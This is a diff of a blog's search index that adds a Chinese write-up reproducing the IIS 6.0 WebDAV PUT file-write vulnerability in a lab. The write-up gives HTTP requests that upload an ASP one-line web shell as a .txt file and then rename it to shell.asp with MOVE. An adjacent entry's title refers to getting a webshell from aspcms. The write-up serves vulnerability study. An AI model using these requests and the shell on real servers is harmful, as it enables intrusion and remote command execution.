@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>IIS任意文件写入漏洞</title>
+      <link href="/archives/1f4414ad.html"/>
+      <url>/archives/1f4414ad.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/03/04/fomu4q.png" alt="0"><br><img src="https://pic.888888.al/i/2023/03/04/fr28m6.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/03/04/fsprkx.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/gjfi01.png" alt="3"></p><p>shell.asp写入成功。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>aspcms拿webshell</title>
       <link href="/archives/d8c67745.html"/>
       <url>/archives/d8c67745.html</url>
